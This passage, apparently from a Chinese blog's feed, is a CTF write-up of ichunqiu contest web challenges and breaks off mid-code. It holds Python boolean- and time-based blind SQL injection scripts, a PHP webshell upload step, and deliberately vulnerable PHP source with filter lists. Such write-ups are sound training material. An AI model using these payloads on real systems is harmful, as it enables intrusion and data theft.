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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
  </entry>
  <entry>
    <title>ichunqiu公益赛web</title>
    <url>/2020/02/21/ichunqiu%E5%85%AC%E7%9B%8A%E8%B5%9Bweb/</url>
    <content><![CDATA[<h1 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h1><p>打开题目是一个登入界面，是NULL的大佬出的题目</p>
<a id="more"></a>

<p><img src="../pic/107.png" alt=""></p>
<p>简单的注册admin,admin登入，发现在Profile界面发现存在<del>xss</del>slelf-xss 还有一个admin界面，提示需要admin才能访问，不过只能获取自己cookie。这是一个坑。</p>
<p>实在是想不到怎么办。</p>
<p>后面想到登入界面可能存在注入,经过测试确实存在sql注入</p>
<p><img src="../pic/109.png" alt=""></p>
<p>编写脚本，在里面有坑，编码不一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/30/2020 9:42 PM</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get(payload):</span><br><span class="line">    url = <span class="string">'http://3f5788fc3e0d4cd29c4857bd75a3087e9c2af7a010664d15.changame.ichunqiu.com/index.php'</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'lname'</span> : <span class="string">'admin\' and '</span>+payload+<span class="string">'#'</span>,</span><br><span class="line">        <span class="string">'lpass'</span> : <span class="string">'admin'</span></span><br><span class="line">    &#125;</span><br><span class="line">    cookies=&#123;</span><br><span class="line">        <span class="string">'PHPSESSID'</span> : <span class="string">'bbvvjmdnv20oa9vpub65s4bkr4'</span>,</span><br><span class="line">        <span class="string">'__jsluid_h'</span> : <span class="string">'a36781563be2b33ed295cec9257f1621'</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = requests.post(url,data=data,cookies=cookies)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line">def binsea(s_payload,len=<span class="number">999</span>):</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print('*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'window.location.href="./zhaopin.php"'</span> in html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            <span class="keyword">print</span>(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">def get_database():</span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    <span class="keyword">print</span>(database)</span><br><span class="line"></span><br><span class="line">def get_tabls(db):</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema=\''</span>+db+<span class="string">'\')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_columns(table):</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name=\''</span>+table+<span class="string">'\')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line">def get_data(columns,table):</span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #nzhaopin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tabls('nzhaopin') #backup,flag,user</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_columns('flag') #id,flaaag</span></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'flaaag'</span>,<span class="string">'flag'</span>) <span class="comment">#flag&#123;04418836-27b8-4f85-8c53-74f7e3e53350&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><p>直接上传php后缀，一句话木马，蚁剑链接，执行/readflag</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">"select * from flllllllag where id=$id"</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>题目给出了源码，经过测试过滤了如下字符</p>
<p><img src="../pic/110.png" alt=""></p>
<p>附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://c4c11f9e99ba4142b9bfc8ed760a65a985f476a30a93485e.changame.ichunqiu.com/?id=0||'</span>+payload+<span class="string">'%23'</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="comment"># return html</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">            payload=<span class="string">"if(ascii(substr(fl4g, %d, 1)) ^ %d, sleep(0), sleep(2))"</span> %(x,c)</span><br><span class="line">            time1 = time.time()</span><br><span class="line">            get(payload)</span><br><span class="line">            time2 = time.time()</span><br><span class="line">            sec = time2 - time1</span><br><span class="line">            <span class="comment"># print(sec,' ',chr(c))</span></span><br><span class="line">            <span class="keyword">if</span> sec &gt;=<span class="number">1.5</span>:</span><br><span class="line">                result+=chr(c)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>打开还是一个登入界面，访问<a href="http://www.zip发现源码" target="_blank" rel="noopener">www.zip发现源码</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"lib.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.$_GET[<span class="string">'action'</span>].<span class="string">".php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]==<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=update'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./index.php?action=login'&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>], $Info, <span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"noob123"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt; </span><br><span class="line">&lt;title&gt;login&lt;/title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">	&lt;form action=<span class="string">"login.php"</span> method=<span class="string">"post"</span> style=<span class="string">"margin-top: 300"</span>&gt;</span><br><span class="line">		&lt;h2&gt;百万前端的用户信息管理系统&lt;/h2&gt;</span><br><span class="line">		&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;/h3&gt;</span><br><span class="line">        		&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> placeholder=<span class="string">"UserName"</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;input type=<span class="string">"password"</span> style=<span class="string">"margin-top: 20"</span> name=<span class="string">"password"</span> placeholder=<span class="string">"password"</span> required&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;button style=<span class="string">"margin-top:20;"</span> type=<span class="string">"submit"</span>&gt;登录&lt;/button&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;img src=<span class="string">'img/1.jpg'</span>&gt;大家记得做好防护&lt;/img&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line">		&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'username'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;br&gt;Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span>, $_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Damn you, hacker!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$user-&gt;login();</span><br><span 